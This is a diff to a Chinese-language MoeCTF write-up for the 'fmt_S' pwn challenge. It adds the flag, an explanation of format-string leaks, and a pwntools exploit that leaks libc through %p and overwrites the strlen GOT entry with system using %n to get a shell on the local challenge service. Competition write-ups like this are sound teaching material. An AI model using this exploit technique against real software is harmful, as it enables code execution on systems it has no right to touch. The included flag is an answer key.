@@ -3416,7 +3416,10 @@ p.interactive()
 
 ## fmt_S
 
-moectf{@DVANceD_leVEl_fMTcd5de62b61}
+> [!NOTE]
+> **FLAG:** `moectf{@DVANceD_leVEl_fMTcd5de62b61}`，后面可能是随机的。
+>
+> 星澜音对于本题的解法过于阴间，但实在不能找到更好的实现方法了，在这里预先致歉。目前仅放出该解法的前半部分和 `exploit.py`，writeup 的后续将于结赛后补充。
 
 用 IDA Pro 逆向程序。
 
@@ -3523,6 +3526,67 @@ size_t __fastcall my_read(_BYTE *buf, size_t nbytes)
 > 倘若 `printf` 具有更多参数，它们会被依次放入寄存器；若寄存器的个数仍无法满足参数的存放，多余的参数则会被压入栈中。但 `printf` 本身并不知道它被调用时传递了多少个参数：`printf` 只会解析第一个参数中 `%` 占位符的个数来决定需要多少个参数。当我们向 `printf` 的格式化字符串中传入过多 `%` 占位符后，`printf` 就会按照寄存器到栈的顺序依次查找。那么问题来了，当我们提供了多余参数的占位符数量后，`printf` 会从哪里寻找多于参数的值呢？答案是，它会继续从栈上读取！这样，`printf` 就会把自己的栈帧和相邻的栈帧当成指针统统打印出来，而这些指针中，或许就包括栈地址、`libc` 地址 和/或 其他敏感数据！
 >
 > 不过我们可能会心生疑惑：`main` 函数会返回到哪呢？事实上，程序启动的时候，并非是直接跳转到 `main` 函数；它通常会由 `libc` 中的一个函数（`__libc_start_main`）负责准备好环境，然后再调用 `main` 函数；所以，`main` 函数执行完毕后，会返回 `__libc_start_main` 中。如果我们用 `printf` 继续向下打印地址，那就非常有可能够到 `main` 函数栈帧中的返回地址！
+
+TODO: 完成 writeup
+
+这里先给出 `exploit.py`。值得注意的是，该 `exploit.py` 的解法相当丑陋，传输空字符串的时间通常超过两分半，且极有可能在传输过程中爆炸或错传。
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('/mnt/s/MoeCTF/Pwn/fmt_s/pwn')
+context.arch = 'amd64'
+# context.log_level = 'debug'
+# context.terminal = ['tmux', 'split-window', '-h']
+
+gdbscript = '''
+set pagination off
+set follow-fork-mode child
+b *talk+82
+b *talk+129
+'''
+
+# io = process(elf.path)
+io = remote("127.0.0.1", 11039)
+# gdb.attach(io, gdbscript = gdbscript)
+
+STRLEN_GOT_ADDR = 0x404008
+
+PAYLOAD_1 = b"%13$p" + b"%" + str(STRLEN_GOT_ADDR - 14).encode() + b"c%8$n"
+# PAYLOAD_1 = b"%13$p" + b"%50c%8$n"
+# PAYLOAD_1 = b"%13$p"
+
+print(PAYLOAD_1)
+print(f"Payload 1 length: {len(PAYLOAD_1)}")
+
+io.recvuntil("You start talking to him...\n")
+log.success("Done 1")
+time.sleep(1)
+io.sendline(PAYLOAD_1)
+time.sleep(1)
+leaked_addr_str = io.recvn(14)
+leaked_addr = int(leaked_addr_str, 16)
+log.success(hex(leaked_addr))
+
+LEAKED_POINT_OFFSET = 0x29d90
+libc_base = leaked_addr - LEAKED_POINT_OFFSET
+system_offset = 0x50d70
+system_addr = libc_base + system_offset
+log.success(hex(system_addr))
+
+time.sleep(1)
+io.send(b"A" * 8)
+time.sleep(1)
+
+val_to_write_1 = system_addr & 0xffffffff
+log.success(hex(val_to_write_1))
+PAYLOAD_2 = b"%" + str(val_to_write_1).encode() + b"c%12$n"
+log.success(len(PAYLOAD_2))
+
+io.send(PAYLOAD_2)
+time.sleep(1)
+io.interactive()
+```
 
 ## shellbox
 
